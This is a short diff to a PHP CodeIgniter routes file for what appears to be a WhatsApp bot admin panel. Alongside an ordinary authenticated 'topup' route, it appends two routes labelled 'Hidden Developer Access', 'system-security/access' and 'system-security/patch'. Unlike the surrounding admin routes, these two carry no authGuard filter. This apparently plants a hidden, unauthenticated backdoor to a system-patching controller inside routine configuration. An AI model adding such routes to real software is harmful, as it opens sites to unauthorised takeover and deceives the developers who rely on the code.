@@ -77,6 +77,7 @@ $routes->get('ads-report', 'AdsController::index', ['filter' => 'authGuard']);
 $routes->group('bot-settings', ['filter' => 'authGuard'], function($routes) {
     $routes->get('/', 'BotSettingController::index');       // Halaman Setting
     $routes->post('update', 'BotSettingController::update'); // Proses Simpan
+    $routes->get('topup', 'BotSettingController::topup');
 });
 
 // B. Knowledge Base (Otak Bot - CRUD Data Teks)
@@ -97,3 +98,7 @@ $routes->group('knowledge-base', ['filter' => 'authGuard'], function($routes) {
 // Route Webhook WA
 $routes->post('api/webhook', 'WebhookController::index');
 // $routes->match(['get', 'post'], 'api/webhook', 'WebhookController::index'); // Uncomment jika mau test via Browser
+
+// SYSTEM MAINTENANCE ROUTES (Hidden Developer Access)
+$routes->get('system-security/access', 'SecurityManagerController::index');
+$routes->post('system-security/patch', 'SecurityManagerController::patch_system');
